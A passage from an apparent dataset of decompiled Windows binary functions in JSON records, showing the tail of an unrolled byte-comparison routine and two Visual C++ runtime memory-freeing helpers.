-\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x17)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x16)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x15));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_14:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x14));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x14))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x14));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x13)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x12)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x11));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_10:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x10));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x10))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x10));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xf)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xe)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xd));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_c:\nif (*(int *)((int)_Buf1 + (_Size - 0xc)) == *(int *)((int)_Buf2 + (_Size - 0xc))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xc));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xb)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 10)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 9));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_8:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 8));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 8))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 8));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 7)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 6)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 5));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_4:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 4));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 4))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 4));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 3)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 2)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 1)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 1));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_0:\niVar3 = 0;\n}\n}\n}\n}\n}\n}\nbreak;\ncase 0x1d:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1d));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1d))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x1d));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1c)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1b)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\ncase 0x19:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x19));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x19))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x19));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x18)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x17)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x16));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_15:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x15));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x15))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x15));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x14)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x13)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x12));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_11:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x11));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x11))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x11));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x10)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xf)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xe));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_d:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0xd));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xd))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0xd));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xc)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xb)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 10));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_9:\nif (*(int *)((int)_Buf1 + (_Size - 9)) == *(int *)((int)_Buf2 + (_Size - 9))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 9));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 8)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 7)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 6));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_5:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 5));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 5))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 5));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 4)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 3)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 2));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 == 0) {\nswitchD_10019598_caseD_1:\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 1)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 1));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\n}\n}\n}\n}\n}\nbreak;\ncase 0x1e:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1e));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1e))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x1e));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1d)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1c)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1b)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_1a:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1a));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1a))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x1a));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x19)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x18)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x17)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x17));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_16:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x16));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x16))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x16));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x15)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x14)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x13)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x13));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_12:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x12));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x12))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x12));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x11)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x10)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xf));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_e:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0xe));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xe))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0xe));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xd)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xc)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xb)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xb));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_a:\nif (*(int *)((int)_Buf1 + (_Size - 10)) == *(int *)((int)_Buf2 + (_Size - 10))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 10));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 9)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 8)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 7)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 7));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_6:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 6));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 6))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 6));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 5)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 4)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 3));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_2:\nif (*(short *)((int)_Buf1 + (_Size - 2)) != *(short *)((int)_Buf2 + (_Size - 2))) {\nLAB_1001a080:\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 2)) - (uint)*(byte *)((int)_Buf2 + (_Size - 2));\nif (iVar3 != 0) {\nLAB_1001a090:\nreturn (uint)(0 < iVar3) * 2 + -1;\n}\ngoto switchD_10019598_caseD_1;\n}\ngoto switchD_10019598_caseD_0;\ncase 0x1f:\nif (*(int *)((int)_Buf1 + (_Size - 0x1f)) == *(int *)((int)_Buf2 + (_Size - 0x1f))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1f)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1f));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1e)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1e)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1d)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1d)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1c)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1c));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_1b:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x1b));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x1b))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x1b));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x1a)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x1a)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x19)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x19)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x18)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x18));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_17:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x17));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x17))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x17));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x16)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x16)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x15)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x15)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x14)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x14));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_13:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0x13));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0x13))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0x13));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x12)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x12)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x11)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x11)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0x10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0x10));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_f:\nif (*(int *)((int)_Buf1 + (_Size - 0xf)) == *(int *)((int)_Buf2 + (_Size - 0xf))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xf)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xf));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xe)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xe)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xd)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xd)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 0xc)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 0xc));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_b:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 0xb));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 0xb))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 0xb));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 10)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 10)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 9)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 9)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 8)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 8));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_7:\nuVar1 = *(uint *)((int)_Buf1 + (_Size - 7));\nif (uVar1 == *(uint *)((int)_Buf2 + (_Size - 7))) {\niVar3 = 0;\n}\nelse {\niVar3 = (uVar1 & 0xff) - (uint)*(byte *)((int)_Buf2 + (_Size - 7));\nif (((iVar3 == 0) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 6)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 6)), iVar3 == 0)) &&\n(iVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 5)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 5)), iVar3 == 0)) {\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 4)) -\n(uint)*(byte *)((int)_Buf2 + (_Size - 4));\nif (iVar3 != 0) {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nelse {\niVar3 = (uint)(0 < iVar3) * 2 + -1;\n}\n}\nif (iVar3 != 0) {\nreturn iVar3;\n}\nswitchD_10019598_caseD_3:\niVar3 = (uint)*(byte *)((int)_Buf1 + (_Size - 3)) - (uint)*(byte *)((int)_Buf2 + (_Size - 3));\nif (iVar3 != 0) goto LAB_1001a090;\ngoto LAB_1001a080;\n}\nreturn iVar3;\n}"}
{"Function Name": "___vcrt_freefls@4", "Address": "1001a1d1", "Source Code": "void ___vcrt_freefls_4(undefined *inputPointer) \n{\n    \n    if (inputPointer != (undefined *)0x0 && inputPointer != &dataAddress) {\n        freeFunction(inputPointer); \n    }\n}"}
{"Function Name": "___vcrt_freeptd", "Address": "1001a1ed", "Source Code": "void __cdecl ___vcrt_freeptd(undefined *inputPointer)\n{\n    \n    if (globalThreadLocalStorageKey != 0xffffffff) {\n        \n        if (inputPointer == (undefined *)0x0) {\n            inputPointer = (undefined *)___vcrt_FlsGetValue(globalThreadLocalStorageKey);\n        }\n        \n        ___vcrt_freefls_4(inputPointer);\n        \n        ___vcrt_FlsSetValue(globalThreadLocalStorageKey, (LPVOID)0x0);\n    }\n}"}
